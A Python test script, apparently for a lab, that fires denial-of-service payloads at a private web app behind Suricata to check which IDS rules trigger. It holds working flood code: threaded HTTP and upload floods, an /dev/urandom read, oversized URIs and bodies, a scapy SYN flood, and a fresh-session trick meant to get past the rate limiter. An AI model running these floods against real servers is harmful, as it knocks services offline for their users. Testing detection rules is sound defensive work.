#!/usr/bin/env python3
"""
Denial of Service (DoS) Test Script
Tests attack vectors against multiple endpoints via Suricata (10.0.0.5).
Pure DoS payloads only - no SQLi, XSS, CMDi, XXE, LFI, or open redirect content.

Features:
- Targets web app through Suricata so IDS rules can inspect traffic
- Auto-clears blocks via NGFW API between payloads
- Includes delays to prevent immediate IP blocking
- Higher-volume tests for rules with elevated thresholds
- SYN flood test (requires root + scapy)

Usage:
    python3 test_dos.py              # Run standard payloads (50 req each)
    python3 test_dos.py --high-vol   # Include higher-volume tests
    python3 test_dos.py --syn        # Include SYN flood test (needs root)
    python3 test_dos.py --all        # Run everything
"""

import requests
import sys
import time
import threading
import argparse
from io import BytesIO

BASE_URL = "http://10.0.0.5"
API_URL = "http://10.0.0.1:5001"
BURST_COUNT = 50
REQUEST_TIMEOUT = 5
UNBLOCK_DELAY = 10
CLEAR_API = f"{API_URL}/api/clear_all_blocks"

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
BOLD = "\033[1m"
RESET = "\033[0m"

HAS_SCAPY = False
try:
    from scapy.all import IP, TCP, sr
    HAS_SCAPY = True
except ImportError:
    pass


def unblock_ip():
    """Clear all blocks via NGFW API to prevent lockout during testing."""
    try:
        requests.post(CLEAR_API, timeout=5)
        return True
    except Exception:
        return False


def safe_delay(seconds):
    """Sleep with progress indicator."""
    for i in range(seconds):
        time.sleep(1)
        sys.stdout.write(f"\r    [{YELLOW}waiting{RESET}] {seconds - i - 1}s remaining...")
        sys.stdout.flush()
    sys.stdout.write("\r    \033[2K")
    sys.stdout.flush()


def get_fresh_session():
    """Create a new session with fresh cookies to bypass rate limiter."""
    s = requests.Session()
    try:
        s.get(BASE_URL + "/", timeout=REQUEST_TIMEOUT)
    except Exception:
        pass
    return s


def baseline_single_request(method, endpoint, **kwargs):
    """Measure baseline response time for a single request."""
    try:
        start = time.time()
        if method == "GET":
            resp = requests.get(f"{BASE_URL}{endpoint}", timeout=REQUEST_TIMEOUT)
        else:
            resp = requests.post(f"{BASE_URL}{endpoint}", timeout=REQUEST_TIMEOUT, **kwargs)
        elapsed = time.time() - start
        return elapsed, resp.status_code
    except Exception:
        return None, None


def flood_endpoint(method, endpoint, payload_data, count=BURST_COUNT):
    """
    Send burst of requests and measure degradation.
    Returns metrics dict.
    """
    results = {"successes": 0, "timeouts": 0, "errors_429": 0, "errors_503": 0, "other_errors": 0, "response_times": [], "failures": 0}
    lock = threading.Lock()

    def send_one():
        try:
            session = get_fresh_session()
            start = time.time()
            if method == "GET":
                resp = session.get(f"{BASE_URL}{endpoint}", timeout=REQUEST_TIMEOUT)
            else:
                resp = session.post(f"{BASE_URL}{endpoint}", timeout=REQUEST_TIMEOUT, **payload_data)
            elapsed = time.time() - start

            with lock:
                results["response_times"].append(elapsed)
                if resp.status_code == 200:
                    results["successes"] += 1
                elif resp.status_code == 429:
                    results["errors_429"] += 1
                elif resp.status_code == 503:
                    results["errors_503"] += 1
                else:
                    results["other_errors"] += 1
        except requests.exceptions.Timeout:
            with lock:
                results["timeouts"] += 1
        except Exception:
            with lock:
                results["failures"] += 1

    threads = []
    batch_size = 10
    for batch_start in range(0, count, batch_size):
        batch_end = min(batch_start + batch_size, count)
        threads = []
        for _ in range(batch_start, batch_end):
            t = threading.Thread(target=send_one)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

    return results


def syn_flood(count=100, target_port=80):
    """
    Send SYN packets using scapy (requires root).
    Tests SID 1000107: SYN Flood (count 100, seconds 5).
    """
    if not HAS_SCAPY:
        return {"successes": 0, "failures": 1, "timeouts": 0, "errors_429": 0,
                "errors_503": 0, "other_errors": 0, "response_times": [],
                "note": "scapy not installed"}

    results = {"successes": 0, "failures": 0, "timeouts": 0, "errors_429": 0,
               "errors_503": 0, "other_errors": count, "response_times": []}
    try:
        target_ip = BASE_URL.split("//")[1]
        start = time.time()
        pkt = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
        sr(pkt, count=count, timeout=1, verbose=False)
        elapsed = time.time() - start
        results["response_times"].append(elapsed)
        results["successes"] = count
        results["other_errors"] = 0
    except PermissionError:
        results["note"] = "requires root"
    except Exception as e:
        results["note"] = str(e)
        results["failures"] = 1

    return results


def evaluate_baseline_vs_flood(baseline_time, results):
    """Determine if DoS impact was detected."""
    if not baseline_time:
        return len(results["response_times"]) > 0

    if results["timeouts"] > 0:
        return True
    if results["errors_429"] > 0:
        return True
    if results["errors_503"] > 0:
        return True
    if results["failures"] > 0:
        return True

    if results["response_times"]:
        avg_flood = sum(results["response_times"]) / len(results["response_times"])
        if avg_flood > baseline_time * 3:
            return True

    return False


STANDARD_PAYLOADS = [
    {
        "id": 1,
        "name": "HTTP Flood (GET /)",
        "endpoint": "/",
        "method": "GET",
        "data": {},
        "count": BURST_COUNT,
        "description": "50 rapid GET requests to homepage, tests rate limiting",
        "triggers": "SID 1000110 (Any HTTP rapid 50/5s)",
        "uncovered": "SID 1000101 (GET 100/10s), SID 1000105 (URI / 100/10s)",
    },
    {
        "id": 2,
        "name": "Auth Flood (POST /login)",
        "endpoint": "/login",
        "method": "POST",
        "data": {"data": {"username": "testuser", "password": "x" * 500}},
        "count": BURST_COUNT,
        "description": "50 POSTs with large password field, expensive DB queries + logging",
        "triggers": "SID 1000102 (POST 50/10s), SID 1000115 (Form flood 50/10s), SID 1000110",
        "uncovered": "SID 1000104 (/login 100/10s)",
    },
    {
        "id": 3,
        "name": "Upload Flood (POST /upload)",
        "endpoint": "/upload",
        "method": "POST",
        "data": {"files": {"file": ("dos_test.txt", b"A" * 10000, "text/plain")}},
        "count": BURST_COUNT,
        "description": "50 file uploads, SHA256 hashing + ClamAV scanning overhead",
        "triggers": "SID 1000102 (POST 50/10s), SID 1000110",
        "uncovered": "SID 1000109 (Large body >1MB)",
    },
    {
        "id": 4,
        "name": "Feedback Flood (POST /feedback)",
        "endpoint": "/feedback",
        "method": "POST",
        "data": {"data": {"name": "dos_user", "message": "A" * 5000}},
        "count": BURST_COUNT,
        "description": "50 large form submissions, DB INSERT + request logging",
        "triggers": "SID 1000102, SID 1000115 (Form flood 50/10s), SID 1000110",
        "uncovered": "None",
    },
    {
        "id": 5,
        "name": "I/O Exhaustion (POST /file)",
        "endpoint": "/file",
        "method": "POST",
        "data": {"data": {"filename": "/dev/urandom"}},
        "count": BURST_COUNT,
        "description": "50 requests to read /dev/urandom, I/O exhaustion",
        "triggers": "SID 1000102, SID 1000115, SID 1000110",
        "uncovered": "None",
    },
]

HIGH_VOLUME_PAYLOADS = [
    {
        "id": 101,
        "name": "High-Volume GET Flood",
        "endpoint": "/",
        "method": "GET",
        "data": {},
        "count": 100,
        "description": "100 GET requests to trigger SID 1000101 (GET 100/10s) and SID 1000105 (/ 100/10s)",
        "triggers": "SID 1000101, SID 1000105, SID 1000110",
        "uncovered": "N/A (designed to cover gaps)",
    },
    {
        "id": 102,
        "name": "High-Volume Auth Flood",
        "endpoint": "/login",
        "method": "POST",
        "data": {"data": {"username": "testuser", "password": "x" * 500}},
        "count": 100,
        "description": "100 POSTs to /login to trigger SID 1000104 (/login 100/10s)",
        "triggers": "SID 1000102, SID 1000104, SID 1000115, SID 1000110",
        "uncovered": "N/A (designed to cover gaps)",
    },
    {
        "id": 103,
        "name": "Combined HTTP Flood (GET+POST)",
        "endpoint": "/",
        "method": "GET",
        "data": {},
        "count": 200,
        "description": "200 mixed requests to trigger SID 1000103 (Any HTTP 200/10s)",
        "triggers": "SID 1000101, SID 1000103, SID 1000105, SID 1000110",
        "uncovered": "N/A (designed to cover gaps)",
    },
    {
        "id": 104,
        "name": "Large URI DoS",
        "endpoint": "/" + "A" * 2500,
        "method": "GET",
        "data": {},
        "count": BURST_COUNT,
        "description": "50 requests with URI >2048 bytes to trigger SID 1000108 (Large URI)",
        "triggers": "SID 1000108, SID 1000110",
        "uncovered": "None",
    },
    {
        "id": 105,
        "name": "Large Request Body DoS",
        "endpoint": "/upload",
        "method": "POST",
        "data": {"files": {"file": ("large.bin", b"B" * 1100000, "application/octet-stream")}},
        "count": BURST_COUNT,
        "description": "50 uploads with >1MB bodies to trigger SID 1000109 (filesize >1MB)",
        "triggers": "SID 1000102, SID 1000109, SID 1000110",
        "uncovered": "None",
    },
    {
        "id": 106,
        "name": "Admin URI Flood",
        "endpoint": "/admin/config.php?action=reset",
        "method": "GET",
        "data": {},
        "count": 50,
        "description": "50 GETs to .php+admin URI to trigger SID 1000111 (.php+admin 50/10s)",
        "triggers": "SID 1000101, SID 1000111, SID 1000110",
        "uncovered": "None",
    },
    {
        "id": 107,
        "name": "TCP Connection Flood",
        "endpoint": "/",
        "method": "GET",
        "data": {},
        "count": 150,
        "description": "150 GET requests with fresh sessions to trigger SID 1000106 (TCP 150/10s)",
        "triggers": "SID 1000101, SID 1000103, SID 1000105, SID 1000106, SID 1000110",
        "uncovered": "None",
    },
]

SPECIAL_PAYLOADS = [
    {
        "id": 200,
        "name": "SYN Flood",
        "endpoint": "N/A (raw packets)",
        "method": "SYN",
        "data": {},
        "count": 100,
        "description": "100 SYN packets to trigger SID 1000107 (SYN Flood 100/5s)",
        "triggers": "SID 1000107",
        "uncovered": "N/A (special test, requires root + scapy)",
        "requires_root": True,
    },
]


def test_payload(payload, use_high_vol=False):
    """Test a single DoS payload."""
    count = payload.get("count", BURST_COUNT)
    print(f"  {BLUE}[~]{RESET} Measuring baseline for {payload['name']}...")
    baseline_time, baseline_status = baseline_single_request(
        payload["method"], payload["endpoint"], **payload.get("data", {})
    )

    if baseline_time:
        print(f"  {BLUE}[~]{RESET} Baseline: {baseline_time:.3f}s (HTTP {baseline_status})")
    else:
        print(f"  {YELLOW}[!]{RESET} Baseline unavailable (endpoint may be slow or unreachable)")

    print(f"  {BLUE}[~]{RESET} Sending {count} requests in concurrent batches...")
    start = time.time()

    if payload.get("method") == "SYN":
        results = syn_flood(count=count)
    else:
        results = flood_endpoint(
            payload["method"], payload["endpoint"], payload.get("data", {}), count
        )

    flood_duration = time.time() - start

    avg_response = sum(results["response_times"]) / len(results["response_times"]) if results["response_times"] else 0

    if payload.get("method") == "SYN":
        passed = results["successes"] > 0
        detail = (
            f"Burst completed in {flood_duration:.2f}s | "
            f"SYN packets sent: {results['successes']} | "
            f"Note: {results.get('note', 'none')}"
        )
    else:
        passed = evaluate_baseline_vs_flood(baseline_time, results)
        detail = (
            f"Burst completed in {flood_duration:.2f}s | "
            f"Success: {results['successes']} | "
            f"429: {results['errors_429']} | "
            f"503: {results['errors_503']} | "
            f"Timeouts: {results['timeouts']} | "
            f"Failures: {results['failures']} | "
            f"Avg response: {avg_response:.3f}s"
        )

    return {
        "id": payload["id"],
        "name": payload["name"],
        "description": payload["description"],
        "passed": passed,
        "detail": detail,
        "triggers": payload.get("triggers", ""),
        "uncovered": payload.get("uncovered", ""),
    }


def print_report(results):
    """Print formatted test results."""
    print("\n" + "=" * 70)
    print(f"{BOLD}DoS Attack Test Results{RESET}")
    print("=" * 70)

    passed_count = sum(1 for r in results if r["passed"])

    for r in results:
        status = f"{GREEN}PASS{RESET}" if r["passed"] else f"{RED}FAIL{RESET}"
        print(f"\n  {BOLD}[{status}]{RESET} #{r['id']}: {r['name']}")
        print(f"    {BOLD}Attack:{RESET} {r['description']}")
        print(f"    {BOLD}Triggers:{RESET} {r['triggers']}")
        if r['uncovered'] and r['uncovered'] != "None" and r['uncovered'] != "N/A (designed to cover gaps)" and r['uncovered'] != "N/A (special test, requires root + scapy)":
            print(f"    {YELLOW}[Gap]{RESET} {r['uncovered']}")
        print(f"    {BOLD}Metrics:{RESET} {r['detail']}")

    print(f"\n{BOLD}Summary: {passed_count}/{len(results)} attack vectors showed measurable impact{RESET}")
    if passed_count >= 5:
        print(f"{GREEN}Significant DoS surface area detected. Server is vulnerable to resource exhaustion.{RESET}")
    elif passed_count >= 3:
        print(f"{YELLOW}Moderate DoS surface area. Some vectors caused measurable degradation.{RESET}")
    else:
        print(f"{RED}Limited DoS impact detected. Server handled the load well or rate limiter was effective.{RESET}")
    print("=" * 70 + "\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DoS Test Script")
    parser.add_argument("--high-vol", action="store_true", help="Include higher-volume tests for uncovered rules")
    parser.add_argument("--syn", action="store_true", help="Include SYN flood test (requires root + scapy)")
    parser.add_argument("--all", action="store_true", help="Run all tests including high-volume and SYN")
    parser.add_argument("--skip-unblock", action="store_true", help="Skip auto-unblock between payloads")
    args = parser.parse_args()

    run_high_vol = args.high_vol or args.all
    run_syn = args.syn or args.all
    skip_unblock = args.skip_unblock

    payloads = list(STANDARD_PAYLOADS)
    if run_high_vol:
        payloads.extend(HIGH_VOLUME_PAYLOADS)
    if run_syn:
        if HAS_SCAPY:
            payloads.extend(SPECIAL_PAYLOADS)
        else:
            print(f"{YELLOW}[!] Scapy not installed, skipping SYN flood test{RESET}")

    print(f"{BOLD}[*] Starting DoS Attack tests against {BASE_URL}{RESET}")
    print(f"[*] Auto-unblock: {'enabled' if not skip_unblock else 'disabled'}")
    print(f"[*] Between-payload delay: {UNBLOCK_DELAY}s")
    print(f"[*] Testing {len(payloads)} attack vectors...\n")

    results = []
    for i, p in enumerate(payloads):
        print(f"{'='*50}")
        print(f"{BOLD}Payload #{p['id']}: {p['name']}{RESET}")
        print(f"{'='*50}")

        if p.get("requires_root"):
            import os
            if os.geteuid() != 0:
                print(f"  {RED}[SKIP]{RESET} Requires root privileges")
                continue

        r = test_payload(p)
        results.append(r)

        if not skip_unblock and i < len(payloads) - 1:
            print(f"  {BLUE}[~]{RESET} Clearing blocks and waiting...")
            unblock_ip()
            safe_delay(UNBLOCK_DELAY)
            print()

    print_report(results)
    sys.exit(0 if any(r["passed"] for r in results) else 1)
